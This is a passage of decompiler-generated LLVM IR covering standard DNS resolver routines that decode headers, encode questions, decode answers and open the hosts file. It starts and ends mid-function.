  %v3_8050168 = load i8, i8* %v2_8050168, align 1
  %v2_805016c = load i32, i32* %esi.global-to-local, align 4
  %v3_805016c = add i32 %v2_805016c, 10
  %v4_805016c = inttoptr i32 %v3_805016c to i8*
  store i8 %v3_8050168, i8* %v4_805016c, align 1
  %v0_805016f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805016f = add i32 %v0_805016f, 44
  %v2_805016f = inttoptr i32 %v1_805016f to i32*
  %v3_805016f = load i32, i32* %v2_805016f, align 4
  %v1_8050172 = trunc i32 %v3_805016f to i8
  %v2_8050172 = load i32, i32* %esi.global-to-local, align 4
  %v3_8050172 = add i32 %v2_8050172, 11
  %v4_8050172 = inttoptr i32 %v3_8050172 to i8*
  store i8 %v1_8050172, i8* %v4_8050172, align 1
  %v2_805017a.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_805017a

dec_label_pc_805017a:                             ; preds = %entry, %dec_label_pc_80500e4
  %v2_805017a = phi i32 [ %v0_80500cd, %entry ], [ %v2_805017a.pre, %dec_label_pc_80500e4 ]
  %v0_805017c = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_80500e4 ]
  store i32 %v2_805017a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805017c

; uselistorder directives
  uselistorder i32 45, { 3, 1, 4, 2, 0 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 2, 1, 0, 3 }
  uselistorder i32 33, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805017a, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050180 = load i32, i32* @ebx, align 4
  store i32 %v0_8050180, i32* %stack_var_-4, align 4
  %v4_8050181 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8050181, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8050189 = load i8, i8* %tmp2, align 1
  %v3_8050189 = zext i8 %v2_8050189 to i32
  %v1_805018c = add i32 %v4_8050181, 1
  %v2_805018c = inttoptr i32 %v1_805018c to i8*
  %v3_805018c = load i8, i8* %v2_805018c, align 1
  %v4_805018c = zext i8 %v3_805018c to i32
  %v2_8050190 = mul nuw nsw i32 %v3_8050189, 256
  %v2_8050193 = or i32 %v4_805018c, %v2_8050190
  %v2_8050195 = inttoptr i32 %tmp to i32*
  store i32 %v2_8050193, i32* %v2_8050195, align 4
  %v0_8050197 = load i32, i32* @ecx, align 4
  %v1_8050197 = add i32 %v0_8050197, 2
  %v2_8050197 = inttoptr i32 %v1_8050197 to i8*
  %v3_8050197 = load i8, i8* %v2_8050197, align 1
  %tmp6 = icmp slt i8 %v3_8050197, 0
  %v2_805019b = zext i1 %tmp6 to i32
  %v1_805019e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805019e = add i32 %v1_805019e, 4
  %v3_805019e = inttoptr i32 %v2_805019e to i32*
  store i32 %v2_805019b, i32* %v3_805019e, align 4
  %v0_80501a1 = load i32, i32* @ecx, align 4
  %v1_80501a1 = add i32 %v0_80501a1, 2
  %v2_80501a1 = inttoptr i32 %v1_80501a1 to i8*
  %v3_80501a1 = load i8, i8* %v2_80501a1, align 1
  %v3_80501a4 = udiv i8 %v3_80501a1, 8
  %tmp7 = urem i8 %v3_80501a4, 16
  %v1_80501a7 = zext i8 %tmp7 to i32
  %v1_80501aa = load i32, i32* %ebx.global-to-local, align 4
  %v2_80501aa = add i32 %v1_80501aa, 8
  %v3_80501aa = inttoptr i32 %v2_80501aa to i32*
  store i32 %v1_80501a7, i32* %v3_80501aa, align 4
  %v0_80501ad = load i32, i32* @ecx, align 4
  %v1_80501ad = add i32 %v0_80501ad, 2
  %v2_80501ad = inttoptr i32 %v1_80501ad to i8*
  %v3_80501ad = load i8, i8* %v2_80501ad, align 1
  %div = udiv i8 %v3_80501ad, 4
  %tmp8 = urem i8 %div, 2
  %v1_80501b4 = zext i8 %tmp8 to i32
  %v1_80501b7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80501b7 = add i32 %v1_80501b7, 12
  %v3_80501b7 = inttoptr i32 %v2_80501b7 to i32*
  store i32 %v1_80501b4, i32* %v3_80501b7, align 4
  %v0_80501ba = load i32, i32* @ecx, align 4
  %v1_80501ba = add i32 %v0_80501ba, 2
  %v2_80501ba = inttoptr i32 %v1_80501ba to i8*
  %v3_80501ba = load i8, i8* %v2_80501ba, align 1
  %div5 = udiv i8 %v3_80501ba, 2
  %tmp9 = urem i8 %div5, 2
  %v1_80501c0 = zext i8 %tmp9 to i32
  %v1_80501c3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80501c3 = add i32 %v1_80501c3, 16
  %v3_80501c3 = inttoptr i32 %v2_80501c3 to i32*
  store i32 %v1_80501c0, i32* %v3_80501c3, align 4
  %v0_80501c6 = load i32, i32* @ecx, align 4
  %v1_80501c6 = add i32 %v0_80501c6, 2
  %v2_80501c6 = inttoptr i32 %v1_80501c6 to i8*
  %v3_80501c6 = load i8, i8* %v2_80501c6, align 1
  %tmp10 = urem i8 %v3_80501c6, 2
  %v1_80501ca = zext i8 %tmp10 to i32
  %v1_80501cd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80501cd = add i32 %v1_80501cd, 20
  %v3_80501cd = inttoptr i32 %v2_80501cd to i32*
  store i32 %v1_80501ca, i32* %v3_80501cd, align 4
  %v0_80501d0 = load i32, i32* @ecx, align 4
  %v1_80501d0 = add i32 %v0_80501d0, 3
  %v2_80501d0 = inttoptr i32 %v1_80501d0 to i8*
  %v3_80501d0 = load i8, i8* %v2_80501d0, align 1
  %tmp11 = icmp slt i8 %v3_80501d0, 0
  %v2_80501d4 = zext i1 %tmp11 to i32
  %v1_80501d7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80501d7 = add i32 %v1_80501d7, 24
  %v3_80501d7 = inttoptr i32 %v2_80501d7 to i32*
  store i32 %v2_80501d4, i32* %v3_80501d7, align 4
  %v0_80501da = load i32, i32* @ecx, align 4
  %v1_80501da = add i32 %v0_80501da, 3
  %v2_80501da = inttoptr i32 %v1_80501da to i8*
  %v3_80501da = load i8, i8* %v2_80501da, align 1
  %tmp12 = urem i8 %v3_80501da, 16
  %v1_80501de = zext i8 %tmp12 to i32
  %v1_80501e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80501e1 = add i32 %v1_80501e1, 28
  %v3_80501e1 = inttoptr i32 %v2_80501e1 to i32*
  store i32 %v1_80501de, i32* %v3_80501e1, align 4
  %v0_80501e4 = load i32, i32* @ecx, align 4
  %v1_80501e4 = add i32 %v0_80501e4, 4
  %v2_80501e4 = inttoptr i32 %v1_80501e4 to i8*
  %v3_80501e4 = load i8, i8* %v2_80501e4, align 1
  %v4_80501e4 = zext i8 %v3_80501e4 to i32
  %v1_80501e8 = add i32 %v0_80501e4, 5
  %v2_80501e8 = inttoptr i32 %v1_80501e8 to i8*
  %v3_80501e8 = load i8, i8* %v2_80501e8, align 1
  %v4_80501e8 = zext i8 %v3_80501e8 to i32
  %v2_80501ec = mul nuw nsw i32 %v4_80501e4, 256
  %v2_80501ef = or i32 %v4_80501e8, %v2_80501ec
  %v1_80501f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80501f1 = add i32 %v1_80501f1, 32
  %v3_80501f1 = inttoptr i32 %v2_80501f1 to i32*
  store i32 %v2_80501ef, i32* %v3_80501f1, align 4
  %v0_80501f4 = load i32, i32* @ecx, align 4
  %v1_80501f4 = add i32 %v0_80501f4, 6
  %v2_80501f4 = inttoptr i32 %v1_80501f4 to i8*
  %v3_80501f4 = load i8, i8* %v2_80501f4, align 1
  %v4_80501f4 = zext i8 %v3_80501f4 to i32
  %v1_80501f8 = add i32 %v0_80501f4, 7
  %v2_80501f8 = inttoptr i32 %v1_80501f8 to i8*
  %v3_80501f8 = load i8, i8* %v2_80501f8, align 1
  %v4_80501f8 = zext i8 %v3_80501f8 to i32
  %v2_80501fc = mul nuw nsw i32 %v4_80501f4, 256
  %v2_80501ff = or i32 %v4_80501f8, %v2_80501fc
  %v1_8050201 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050201 = add i32 %v1_8050201, 36
  %v3_8050201 = inttoptr i32 %v2_8050201 to i32*
  store i32 %v2_80501ff, i32* %v3_8050201, align 4
  %v0_8050204 = load i32, i32* @ecx, align 4
  %v1_8050204 = add i32 %v0_8050204, 8
  %v2_8050204 = inttoptr i32 %v1_8050204 to i8*
  %v3_8050204 = load i8, i8* %v2_8050204, align 1
  %v4_8050204 = zext i8 %v3_8050204 to i32
  %v1_8050208 = add i32 %v0_8050204, 9
  %v2_8050208 = inttoptr i32 %v1_8050208 to i8*
  %v3_8050208 = load i8, i8* %v2_8050208, align 1
  %v4_8050208 = zext i8 %v3_8050208 to i32
  %v2_805020c = mul nuw nsw i32 %v4_8050204, 256
  %v2_805020f = or i32 %v4_8050208, %v2_805020c
  %v1_8050211 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050211 = add i32 %v1_8050211, 40
  %v3_8050211 = inttoptr i32 %v2_8050211 to i32*
  store i32 %v2_805020f, i32* %v3_8050211, align 4
  %v0_8050214 = load i32, i32* @ecx, align 4
  %v1_8050214 = add i32 %v0_8050214, 10
  %v2_8050214 = inttoptr i32 %v1_8050214 to i8*
  %v3_8050214 = load i8, i8* %v2_8050214, align 1
  %v4_8050214 = zext i8 %v3_8050214 to i32
  %v1_8050218 = add i32 %v0_8050214, 11
  %v2_8050218 = inttoptr i32 %v1_8050218 to i8*
  %v3_8050218 = load i8, i8* %v2_8050218, align 1
  %v4_8050218 = zext i8 %v3_8050218 to i32
  %v2_805021c = mul nuw nsw i32 %v4_8050214, 256
  %v2_805021f = or i32 %v4_8050218, %v2_805021c
  %v1_8050221 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050221 = add i32 %v1_8050221, 44
  %v3_8050221 = inttoptr i32 %v2_8050221 to i32*
  store i32 %v2_805021f, i32* %v3_8050221, align 4
  %v2_8050229 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050229, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 11, { 7, 8, 2, 3, 5, 6, 9, 4, 1, 10, 11, 0 }
  uselistorder i32 40, { 2, 3, 8, 5, 6, 7, 4, 0, 1, 9, 10, 11, 12 }
  uselistorder i32 7, { 7, 8, 2, 4, 5, 3, 0, 1, 6, 9, 10, 11, 12 }
  uselistorder i32 6, { 12, 13, 2, 3, 15, 16, 0, 6, 10, 8, 9, 7, 14, 17, 18, 4, 1, 5, 11 }
  uselistorder i32 28, { 11, 12, 7, 8, 13, 25, 34, 24, 17, 18, 2, 19, 20, 21, 22, 23, 3, 4, 5, 0, 26, 6, 9, 10, 14, 15, 27, 28, 29, 30, 31, 32, 1, 33, 35, 16 }
  uselistorder i8 2, { 0, 1, 2, 3, 4, 18, 5, 13, 19, 16, 6, 17, 7, 8, 9, 10, 11, 14, 15, 12 }
  uselistorder i8 4, { 0, 2, 1, 3, 4 }
  uselistorder i8 8, { 0, 3, 4, 2, 5, 1, 6, 7 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_805022c = load i32, i32* @edi, align 4
  %v0_805022d = load i32, i32* @esi, align 4
  %v0_805022e = load i32, i32* @ebx, align 4
  store i32 %v0_805022e, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_805023b = load i32, i32* @eax, align 4
  %v1_805023e = inttoptr i32 %tmp3 to i32*
  %v2_805023e = load i32, i32* %v1_805023e, align 4
  %v7_8050240 = inttoptr i32 %v2_805023e to i8*
  %v8_8050240 = call i32 @__encode_dotted(i8* %v7_8050240, i32 %tmp2, i32 %tmp, i32 %v0_805023b, i32 %v0_805022e, i32 %v0_805022d, i32 %v0_805022c)
  store i32 %v8_8050240, i32* @ecx, align 4
  %v2_805024a = icmp slt i32 %v8_8050240, 0
  br i1 %v2_805024a, label %dec_label_pc_8050279, label %dec_label_pc_805024e

dec_label_pc_805024e:                             ; preds = %entry
  %v0_805024e = load i32, i32* @ebx, align 4
  %v2_805024e = sub i32 %v0_805024e, %v8_8050240
  %v1_8050250 = add i32 %v2_805024e, -3
  %v6_8050250 = sub i32 2, %v2_805024e
  %v7_8050250 = and i32 %v6_8050250, %v2_805024e
  %v8_8050250 = icmp slt i32 %v7_8050250, 0
  %v9_8050250 = icmp eq i32 %v1_8050250, 0
  %v10_8050250 = icmp slt i32 %v1_8050250, 0
  %v3_8050253 = icmp eq i1 %v10_8050250, %v8_8050250
  %v4_8050253 = icmp eq i1 %v9_8050250, false
  %v5_8050253 = and i1 %v4_8050253, %v3_8050253
  br i1 %v5_8050253, label %dec_label_pc_805025a, label %dec_label_pc_8050255

dec_label_pc_8050255:                             ; preds = %dec_label_pc_805024e
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8050279

dec_label_pc_805025a:                             ; preds = %dec_label_pc_805024e
  %v0_805025a = load i32, i32* @edi, align 4
  %v2_805025a = add i32 %v0_805025a, %v8_8050240
  store i32 %v2_805025a, i32* @edx, align 4
  %v1_805025d = add i32 %v8_8050240, 4
  store i32 %v1_805025d, i32* @ecx, align 4
  %v0_8050260 = load i32, i32* @esi, align 4
  %v1_8050260 = add i32 %v0_8050260, 5
  %v2_8050260 = inttoptr i32 %v1_8050260 to i8*
  %v3_8050260 = load i8, i8* %v2_8050260, align 1
  %v3_8050264 = inttoptr i32 %v2_805025a to i8*
  store i8 %v3_8050260, i8* %v3_8050264, align 1
  %v0_8050266 = load i32, i32* @esi, align 4
  %v1_8050266 = add i32 %v0_8050266, 4
  %v2_8050266 = inttoptr i32 %v1_8050266 to i32*
  %v3_8050266 = load i32, i32* %v2_8050266, align 4
  %v1_8050269 = trunc i32 %v3_8050266 to i8
  %v2_8050269 = load i32, i32* @edx, align 4
  %v3_8050269 = add i32 %v2_8050269, 1
  %v4_8050269 = inttoptr i32 %v3_8050269 to i8*
  store i8 %v1_8050269, i8* %v4_8050269, align 1
  %v0_805026c = load i32, i32* @esi, align 4
  %v1_805026c = add i32 %v0_805026c, 9
  %v2_805026c = inttoptr i32 %v1_805026c to i8*
  %v3_805026c = load i8, i8* %v2_805026c, align 1
  %v2_8050270 = load i32, i32* @edx, align 4
  %v3_8050270 = add i32 %v2_8050270, 2
  %v4_8050270 = inttoptr i32 %v3_8050270 to i8*
  store i8 %v3_805026c, i8* %v4_8050270, align 1
  %v0_8050273 = load i32, i32* @esi, align 4
  %v1_8050273 = add i32 %v0_8050273, 8
  %v2_8050273 = inttoptr i32 %v1_8050273 to i32*
  %v3_8050273 = load i32, i32* %v2_8050273, align 4
  %v1_8050276 = trunc i32 %v3_8050273 to i8
  %v2_8050276 = load i32, i32* @edx, align 4
  %v3_8050276 = add i32 %v2_8050276, 3
  %v4_8050276 = inttoptr i32 %v3_8050276 to i8*
  store i8 %v1_8050276, i8* %v4_8050276, align 1
  %v0_8050279.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050279

dec_label_pc_8050279:                             ; preds = %entry, %dec_label_pc_8050255, %dec_label_pc_805025a
  %v0_8050279 = phi i32 [ %v8_8050240, %entry ], [ -1, %dec_label_pc_8050255 ], [ %v0_8050279.pre, %dec_label_pc_805025a ]
  %v2_805027b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805027b, i32* @ebx, align 4
  store i32 %v0_805022c, i32* @edi, align 4
  ret i32 %v0_8050279

; uselistorder directives
  uselistorder i32 %v1_8050250, { 1, 0 }
  uselistorder i32 %v2_805024e, { 0, 2, 1 }
  uselistorder i32 %v8_8050240, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8050279, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_805028b = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8050293 = icmp slt i32 %v2_805028b, 0
  br i1 %v2_8050293, label %dec_label_pc_805029a, label %dec_label_pc_8050297

dec_label_pc_8050297:                             ; preds = %entry
  %v1_8050297 = add i32 %v2_805028b, 4
  br label %dec_label_pc_805029a

dec_label_pc_805029a:                             ; preds = %entry, %dec_label_pc_8050297
  %v0_805029d = phi i32 [ %v2_805028b, %entry ], [ %v1_8050297, %dec_label_pc_8050297 ]
  ret i32 %v0_805029d

; uselistorder directives
  uselistorder label %dec_label_pc_805029a, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80502a0 = load i32, i32* @ebp, align 4
  %v0_80502a1 = load i32, i32* @edi, align 4
  %v0_80502a2 = load i32, i32* @esi, align 4
  %v0_80502a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80502a3, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_80502c4 = ptrtoint i32* %stack_var_-272 to i32
  %v4_80502d1 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_80502c4, i32 256)
  store i32 %v4_80502d1, i32* @edi, align 4
  %v3_80502db = icmp slt i32 %v4_80502d1, 0
  br i1 %v3_80502db, label %dec_label_pc_805038c, label %dec_label_pc_80502e3

dec_label_pc_80502e3:                             ; preds = %entry
  %v0_80502e3 = load i32, i32* @ebx, align 4
  %v3_80502e3 = add i32 %v0_80502e3, %v4_80502d1
  %v0_80502e5 = load i32, i32* @esi, align 4
  %v2_80502e5 = sub i32 %v0_80502e5, %v3_80502e3
  %v1_80502eb = add i32 %v2_80502e5, -10
  %v10_80502eb = icmp slt i32 %v1_80502eb, 0
  store i32 %v1_80502eb, i32* @esi, align 4
  %v1_80502f2 = icmp eq i1 %v10_80502eb, false
  br i1 %v1_80502f2, label %dec_label_pc_80502fb, label %dec_label_pc_80502f4

dec_label_pc_80502f4:                             ; preds = %dec_label_pc_80502e3
  br label %dec_label_pc_805038c

dec_label_pc_80502fb:                             ; preds = %dec_label_pc_80502e3
  %v6_8050302 = add i32 %v3_80502e3, %tmp4
  store i32 %v6_8050302, i32* @ebx, align 4
  %v1_805030e = bitcast i32* %stack_var_-272 to i8*
  %v2_805030e = call i32 @__GI_strdup(i8* %v1_805030e)
  %v1_8050313 = load i32, i32* @ebp, align 4
  %v2_8050313 = inttoptr i32 %v1_8050313 to i32*
  store i32 %v2_805030e, i32* %v2_8050313, align 4
  %v0_8050316 = load i32, i32* @ebx, align 4
  %v1_8050316 = add i32 %v0_8050316, 4
  store i32 %v1_8050316, i32* %esi.global-to-local, align 4
  %v1_8050319 = inttoptr i32 %v0_8050316 to i8*
  %v2_8050319 = load i8, i8* %v1_8050319, align 1
  %v3_8050319 = zext i8 %v2_8050319 to i32
  %v1_805031c = add i32 %v0_8050316, 1
  %v2_805031c = inttoptr i32 %v1_805031c to i8*
  %v3_805031c = load i8, i8* %v2_805031c, align 1
  %v4_805031c = zext i8 %v3_805031c to i32
  %v2_8050320 = mul nuw nsw i32 %v3_8050319, 256
  %v2_8050323 = or i32 %v4_805031c, %v2_8050320
  %v1_8050325 = load i32, i32* @ebp, align 4
  %v2_8050325 = add i32 %v1_8050325, 4
  %v3_8050325 = inttoptr i32 %v2_8050325 to i32*
  store i32 %v2_8050323, i32* %v3_8050325, align 4
  %v0_8050328 = load i32, i32* @ebx, align 4
  %v1_8050328 = add i32 %v0_8050328, 2
  %v2_8050328 = inttoptr i32 %v1_8050328 to i8*
  %v3_8050328 = load i8, i8* %v2_8050328, align 1
  %v4_8050328 = zext i8 %v3_8050328 to i32
  %v1_805032c = add i32 %v0_8050328, 3
  %v2_805032c = inttoptr i32 %v1_805032c to i8*
  %v3_805032c = load i8, i8* %v2_805032c, align 1
  %v4_805032c = zext i8 %v3_805032c to i32
  %v2_8050330 = mul nuw nsw i32 %v4_8050328, 256
  %v2_8050333 = or i32 %v4_805032c, %v2_8050330
  %v1_8050335 = load i32, i32* @ebp, align 4
  %v2_8050335 = add i32 %v1_8050335, 8
  %v3_8050335 = inttoptr i32 %v2_8050335 to i32*
  store i32 %v2_8050333, i32* %v3_8050335, align 4
  %v0_8050338 = load i32, i32* @ebx, align 4
  %v1_8050338 = add i32 %v0_8050338, 4
  %v2_8050338 = inttoptr i32 %v1_8050338 to i8*
  %v3_8050338 = load i8, i8* %v2_8050338, align 1
  %v4_8050338 = zext i8 %v3_8050338 to i32
  %v0_805033c = load i32, i32* %esi.global-to-local, align 4
  %v1_805033c = add i32 %v0_805033c, 1
  %v2_805033c = inttoptr i32 %v1_805033c to i8*
  %v3_805033c = load i8, i8* %v2_805033c, align 1
  %v4_805033c = zext i8 %v3_805033c to i32
  %v2_8050340 = mul nuw i32 %v4_8050338, 16777216
  %v2_8050343 = mul nuw nsw i32 %v4_805033c, 65536
  %v1_8050346 = add i32 %v0_805033c, 2
  %v2_8050346 = inttoptr i32 %v1_8050346 to i8*
  %v3_8050346 = load i8, i8* %v2_8050346, align 1
  %v4_8050346 = zext i8 %v3_8050346 to i32
  %v2_805034a = mul nuw nsw i32 %v4_8050346, 256
  %v2_805034d = or i32 %v2_8050343, %v2_8050340
  %v1_805034f = add i32 %v0_805033c, 3
  %v2_805034f = inttoptr i32 %v1_805034f to i8*
  %v3_805034f = load i8, i8* %v2_805034f, align 1
  %v4_805034f = zext i8 %v3_805034f to i32
  %v2_8050353 = or i32 %v4_805034f, %v2_805034d
  %v2_8050355 = or i32 %v2_8050353, %v2_805034a
  store i32 %v2_8050355, i32* @ecx, align 4
  %v1_8050357 = load i32, i32* @ebp, align 4
  %v2_8050357 = add i32 %v1_8050357, 12
  %v3_8050357 = inttoptr i32 %v2_8050357 to i32*
  store i32 %v2_8050355, i32* %v3_8050357, align 4
  %v0_805035a = load i32, i32* @ebx, align 4
  %v1_805035a = add i32 %v0_805035a, 8
  %v2_805035a = inttoptr i32 %v1_805035a to i8*
  %v3_805035a = load i8, i8* %v2_805035a, align 1
  %v4_805035a = zext i8 %v3_805035a to i32
  %v1_805035e = add i32 %v0_805035a, 9
  %v2_805035e = inttoptr i32 %v1_805035e to i8*
  %v3_805035e = load i8, i8* %v2_805035e, align 1
  %v4_805035e = zext i8 %v3_805035e to i32
  %v2_8050362 = mul nuw nsw i32 %v4_805035a, 256
  %v1_8050365 = add i32 %v0_805035a, 10
  %v2_8050368 = or i32 %v4_805035e, %v2_8050362
  store i32 %v2_8050368, i32* @edx, align 4
  %v1_805036a = load i32, i32* @ebp, align 4
  %v2_805036a = add i32 %v1_805036a, 20
  %v3_805036a = inttoptr i32 %v2_805036a to i32*
  store i32 %v1_8050365, i32* %v3_805036a, align 4
  %v0_805036d = load i32, i32* @edx, align 4
  %v1_805036d = load i32, i32* @ebp, align 4
  %v2_805036d = add i32 %v1_805036d, 16
  %v3_805036d = inttoptr i32 %v2_805036d to i32*
  store i32 %v0_805036d, i32* %v3_805036d, align 4
  %v1_8050377 = add i32 %v3_80502e3, 10
  %v1_805037a = load i32, i32* @ebp, align 4
  %v2_805037a = add i32 %v1_805037a, 24
  %v3_805037a = inttoptr i32 %v2_805037a to i32*
  store i32 %v1_8050377, i32* %v3_805037a, align 4
  %v4_805037d = load i32, i32* @edx, align 4
  %v5_8050381 = icmp slt i32 %v1_80502eb, %v4_805037d
  br i1 %v5_8050381, label %dec_label_pc_8050383, label %dec_label_pc_8050388

dec_label_pc_8050383:                             ; preds = %dec_label_pc_80502fb
  br label %dec_label_pc_805038c

dec_label_pc_8050388:                             ; preds = %dec_label_pc_80502fb
  %v1_8050388 = load i32, i32* @edi, align 4
  %v2_8050388 = add i32 %v4_805037d, 10
  %v3_8050388 = add i32 %v2_8050388, %v1_8050388
  br label %dec_label_pc_805038c

dec_label_pc_805038c:                             ; preds = %entry, %dec_label_pc_8050383, %dec_label_pc_80502f4, %dec_label_pc_8050388
  %v0_8050392 = phi i32 [ %v4_80502d1, %entry ], [ -1, %dec_label_pc_8050383 ], [ %v1_80502eb, %dec_label_pc_80502f4 ], [ %v3_8050388, %dec_label_pc_8050388 ]
  %v2_8050394 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050394, i32* @ebx, align 4
  store i32 %v0_80502a2, i32* @esi, align 4
  store i32 %v0_80502a1, i32* @edi, align 4
  store i32 %v0_80502a0, i32* @ebp, align 4
  ret i32 %v0_8050392

; uselistorder directives
  uselistorder i32 %v1_80502eb, { 0, 1, 3, 2 }
  uselistorder i32 %v3_80502e3, { 1, 0, 2 }
  uselistorder i32 %v4_80502d1, { 1, 0, 2, 3 }
  uselistorder i32 24, { 8, 9, 15, 0, 10, 11, 12, 16, 2, 3, 7, 4, 5, 6, 13, 17, 18, 19, 20, 21, 22, 23, 24, 1, 14 }
  uselistorder i32 20, { 13, 14, 15, 16, 3, 22, 20, 5, 21, 17, 18, 4, 23, 24, 2, 7, 8, 10, 9, 11, 12, 25, 26, 27, 0, 28, 1, 29, 6, 30, 31, 32, 19 }
  uselistorder i32 9, { 9, 10, 11, 12, 4, 13, 14, 15, 1, 7, 0, 5, 16, 17, 18, 19, 8, 6, 3, 2 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 9 }
  uselistorder i32 3, { 34, 35, 36, 37, 38, 39, 20, 4, 21, 15, 42, 7, 40, 22, 9, 8, 5, 1, 2, 0, 23, 6, 24, 32, 16, 10, 33, 25, 26, 27, 28, 29, 30, 41, 17, 18, 31, 14, 12, 13, 11, 3, 19 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder label %dec_label_pc_805038c, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_80503a9 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_8052bc5.416 to i32), i32 ptrtoint (i32* @global_var_8052b90.403 to i32))
  store i32 %v3_80503a9, i32* @eax, align 4
  %v1_80503b1 = icmp eq i32 %v3_80503a9, 0
  %v1_80503b3 = icmp eq i1 %v1_80503b1, false
  br i1 %v1_80503b3, label %dec_label_pc_80503c9, label %dec_label_pc_80503b5

dec_label_pc_80503b5:                             ; preds = %entry
  %v3_80503c1 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_8052bd0.417 to i32), i32 ptrtoint (i32* @global_var_8052b90.403 to i32))
  br label %dec_label_pc_80503c9

dec_label_pc_80503c9:                             ; preds = %entry, %dec_label_pc_80503b5
  %v0_80503cc = phi i32 [ %v3_80503a9, %entry ], [ %v3_80503c1, %dec_label_pc_80503b5 ]
  ret i32 %v0_80503cc

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 1, 0, 3, 2, 7, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8052b90.403 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_80503c9, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp59 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_80503cd = load i32, i32* @ebp, align 4
  %v0_80503ce = load i32, i32* @edi, align 4
  %v0_80503cf = load i32, i32* @esi, align 4
  %v0_80503d0 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_80503de = sub i32 0, %arg6
  %v1_80503e0 = urem i32 %v1_80503de, 4
  %v2_80503e0 = icmp eq i32 %v1_80503e0, 0
  store i32 %v1_80503e0, i32* %eax.global-to-local, align 4
  br i1 %v2_80503e0, label %dec_label_pc_80503f1, label %dec_label_pc_80503e5

dec_label_pc_80503e5:                             ; preds = %entry
  %v2_80503e5 = sub i32 %arg7, %v1_80503e0
  %v7_80503e5 = icmp ugt i32 %v1_80503e0, %arg7
  br i1 %v7_80503e5, label %dec_label_pc_8050695, label %dec_label_pc_80503ed

dec_label_pc_80503ed:                             ; preds = %dec_label_pc_80503e5
  %v2_80503ed = add i32 %v1_80503e0, %arg6
  store i32 %v2_80503ed, i32* @ebx, align 4
  store i32 %v2_80503e5, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80503f1

dec_label_pc_80503f1:                             ; preds = %entry, %dec_label_pc_80503ed
  %v0_80503fa = phi i32 [ %arg6, %entry ], [ %v2_80503ed, %dec_label_pc_80503ed ]
  %v0_80503fd = phi i32 [ %arg7, %entry ], [ %v2_80503e5, %dec_label_pc_80503ed ]
  %tmp149 = icmp ult i32 %v0_80503fd, 32
  br i1 %tmp149, label %dec_label_pc_8050695, label %dec_label_pc_80503fa

dec_label_pc_80503fa:                             ; preds = %dec_label_pc_80503f1
  %v1_80503fa = add i32 %v0_80503fa, 32
